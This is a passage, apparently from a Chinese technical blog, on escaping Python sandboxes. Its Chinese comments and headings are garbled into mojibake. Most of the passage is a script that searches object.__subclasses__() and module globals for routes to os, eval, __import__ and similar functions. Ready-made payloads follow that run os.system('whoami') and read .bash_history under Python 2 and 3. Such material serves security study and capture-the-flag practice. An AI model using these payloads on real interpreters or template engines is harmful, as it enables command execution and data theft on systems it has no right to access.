class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;lib-tk&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pdb.doc&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plat-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;wsgiref.egg-info&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3æ ‡å‡†åº“æ¨¡å—</span></span><br><span class="line">modules3 = [<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;config-3.8-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;contextvars&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dataclasses&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;_py_abc&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;_sysconfigdata__x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;tkinter&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å±é™©æ¨¡å—</span></span><br><span class="line">methods = [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;import_module&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;types&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸºæœ¬ç±»å‹</span></span><br><span class="line">types = [<span class="string">&#x27;&#x27;</span>, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># objectçš„æ´¾ç”Ÿç±»</span></span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å±é™©æ ‡å‡†åº“æ¨¡å—</span></span><br><span class="line">risk_modules = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># éå†æ´¾ç”Ÿç±»å¹¶è·å–æ¨¡å—</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">object</span>.__subclasses__())):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subclasses[i] = <span class="built_in">object</span>.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------ æ€è·¯äºŒ ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥äº†å±é™©æ¨¡å—çš„æ´¾ç”Ÿç±»</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method == submodule:</span><br><span class="line">                <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.<span class="built_in">format</span>(i=i, method=method))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------ ç¼“å†²åŒº ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ¤æ–­Pythonç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">if</span> (sys.version_info[<span class="number">0</span>]) == <span class="number">3</span>:</span><br><span class="line">    modules = modules3</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥äº†å±é™©æ¨¡å—çš„æ ‡å‡†åº“</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = <span class="built_in">__import__</span>(module)  <span class="comment"># å¯¼å…¥æ¨¡å—</span></span><br><span class="line">        attrs = <span class="built_in">dir</span>(m)          <span class="comment"># è·å–å±æ€§ä¸æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs: <span class="comment"># è‹¥å­˜åœ¨å±é™©æ¨¡å—</span></span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------ æ€è·¯ä¸‰ ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¼å…¥äº†å±é™©æ ‡å‡†åº“çš„æ´¾ç”Ÿç±»</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> risk_module <span class="keyword">in</span> risk_modules.keys():</span><br><span class="line">            <span class="keyword">if</span> risk_module == submodule:</span><br><span class="line">                <span class="keyword">for</span> method <span class="keyword">in</span> risk_modules[risk_module]:</span><br><span class="line">                    <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.<span class="built_in">format</span>(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------ æ€è·¯å›› ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŸºæœ¬ç±»å‹çš„ç‰¹æ®Šæ–¹æ³•</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> types:</span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> <span class="built_in">dir</span>(t):</span><br><span class="line">        <span class="comment"># å¾…æ¯”è¾ƒç±»å‹</span></span><br><span class="line">        c = <span class="built_in">str</span>(t.__getattribute__(method).__class__)</span><br><span class="line">        <span class="comment"># Python2ç‰¹æ®Šç±»å‹</span></span><br><span class="line">        c2 = <span class="string">&quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="comment"># Python3ç‰¹æ®Šç±»å‹</span></span><br><span class="line">        c3 = <span class="string">&quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> c == c2 <span class="keyword">or</span> c == c3:</span><br><span class="line">            <span class="comment"># è½¬ä¹‰åŒå¼•å·</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                t = <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;</span>.<span class="built_in">format</span>(t=t, method=method))</span><br></pre></td></tr></table></figure>
<h4 id="æ€è·¯ä¸€å®ä¾‹"><a class="markdownIt-Anchor" href="#æ€è·¯ä¸€å®ä¾‹"></a> æ€è·¯ä¸€å®ä¾‹</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">37</span>].__call__(<span class="built_in">eval</span>, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2 </span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">29</span>].__call__(<span class="built_in">eval</span>, <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;.bash_history&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<h4 id="æ€è·¯äºŒå®ä¾‹"><a class="markdownIt-Anchor" href="#æ€è·¯äºŒå®ä¾‹"></a> æ€è·¯äºŒå®ä¾‹</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">134</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="æ€è·¯ä¸‰å®ä¾‹"><a class="markdownIt-Anchor" href="#æ€è·¯ä¸‰å®ä¾‹"></a> æ€è·¯ä¸‰å®ä¾‹</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">170</span>].__init__.__globals__[<span class="string">&#x27;_collections_abc&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="æ€è·¯ä¸‰ç‰¹ä¾‹"><a class="markdownIt-Anchor" href="#æ€è·¯ä¸‰ç‰¹ä¾‹"></a> æ€è·¯ä¸‰ç‰¹ä¾‹</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">134</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="æ€è·¯å››å®ä¾‹"><a class="markdownIt-Anchor" href="#æ€è·¯å››å®ä¾‹"></a> æ€è·¯å››å®ä¾‹</h4>
